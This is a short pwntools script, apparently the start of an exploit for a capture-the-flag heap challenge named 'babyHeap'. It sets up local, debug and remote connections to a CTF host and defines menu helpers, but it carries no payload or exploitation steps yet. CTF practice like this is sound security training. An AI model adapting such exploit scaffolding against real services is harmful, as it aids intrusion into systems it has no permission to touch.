#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn
exe = pwn.context.binary = pwn.ELF('./babyHeap')
libc = pwn.ELF("./libc.so.6")
pwn.context.terminal = ["tmux", "splitw", "-h"]
if pwn.args.GDB:
    io = pwn.gdb.debug(exe.path, gdbscript='c\n')
elif pwn.args.REMOTE:
    io = pwn.remote("gc1.eng.run", 32469)
else:
    io = exe.process()


def create(size, count):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b': ', f'{count}'.encode())
    io.sendlineafter(b'>>', f'{size}'.encode())


def delete():
    io.sendlineafter(b'>>', b'2')


def view(idx):
    io.sendlineafter(b'>>', b'4')
    io.sendlineafter(b': ', f'{idx}'.encode())
    return io.recvline(keepends=False)


'''
1 - 1040 - 0x410
2 - 512  - 0x200
3 - 128  - 0x80
'''
create(3, 3)
io.interactive()
